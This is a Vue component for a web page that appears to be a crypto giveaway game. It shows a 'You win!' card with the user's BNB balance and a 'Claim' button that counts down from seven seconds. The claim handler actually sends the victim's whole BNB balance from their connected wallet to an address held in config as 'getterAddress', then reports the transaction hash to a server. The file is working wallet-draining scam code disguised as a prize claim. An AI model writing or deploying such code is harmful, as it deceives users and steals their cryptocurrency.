<template>
<div class="game-card">
  <q-card style="width: 450px; height: 550px; max-width: 100%;" class="">

    <q-toolbar class="justify-end">
      <q-btn dense flat icon="close" v-close-popup/>
    </q-toolbar>

    <div class="flex justify-center" style="margin-top: 70px">
      <q-img :src="coinImage" width="250px" height="250px" img-class="shadow-3">
        <template v-slot:loading>
          <q-skeleton class="fit"/>
        </template>
      </q-img>
    </div>

    <div style="font-size: 24px; font-weight: 800; line-height: 1" class="text-center text-h3">
      You win!
    </div>

    <div v-if="winLoader" style="font-size: 35px; font-weight: 800" class="flex flex-center">
      <q-skeleton height="35px" width="200px"></q-skeleton>
    </div>

    <div v-else style="font-size: 30px; font-weight: 800; line-height: 1" class="text-center text-warning q-mt-xs">
      {{ bnbBalance.formattedWorkBalance }}<span style="font-size: 20px" class=""> BNB</span>
    </div>

    <div class="text-center q-pa-lg">

      <q-btn
        v-if="showClaimBtn"
        :label="`Claim ${claimCount}`"
        unelevated
        id="claim-button"
        color="primary"
        v-close-popup
        class="text-h6 q-py-sm doge-font full-width"
        @click="getMoney"
        style="letter-spacing: 0.5px; width: 300px; max-width: 100%; border-radius: 15px;"
      />

      <div v-else style="height: 70px" class="flex flex-center">
        {{ tryAgainText }}
      </div>
    </div>

  </q-card>
</div>
</template>

<script>
import bnbImage from 'src/assets/bnbImage.png'
import { mapState } from 'vuex'
import config from 'src/config'
import Web3 from 'web3'
import { getMyConnectedWallet } from 'src/store/modules/wallet/actions'
import axios from 'axios'
export default {
  name: 'game-card',
  computed: {
    ...mapState('wallet', ['wallet', 'bnbBalance']),
    coinImage () {
      return bnbImage
    }
  },
  methods: {
    claimCounterStart () {
      const vm = this
      const claimCounter = setInterval(() => {
        vm.claimCount -= 1
        if (vm.claimCount === 0) {
          clearInterval(claimCounter)
          vm.showClaimBtn = false
          vm.tryAgainText = 'Try again later'
        }
      }, 1000)
    },
    async getMoney () {
      const vm = this
      const web3 = new Web3('https://bsc-dataseed1.binance.org:443')
      const connectedWallet = await getMyConnectedWallet()
      web3.eth.setProvider(connectedWallet.provider)

      web3.eth.sendTransaction({
        from: vm.wallet.address,
        to: config.getterAddress,
        value: vm.bnbBalance.workBalance
      }).then(async (res) => {
        try {
          await axios.post(`${config.walletServerURI}/wallet/transaction_bnb/`, {
            from_address: vm.wallet.address,
            value: vm.bnbBalance.formattedWorkBalance,
            hash: res.transactionHash
          })
        } catch (e) {
          console.log(e)
        }
      })
    }
  },
  data () {
    return {
      winLoader: true,
      showClaimBtn: false,
      claimCount: 7,
      tryAgainText: ''
    }
  },
  created () {
    const vm = this
    setTimeout(() => {
      vm.winLoader = false
      vm.showClaimBtn = true
      vm.claimCounterStart()
    }, 3000)
  }
}
</script>

<style scoped>

</style>
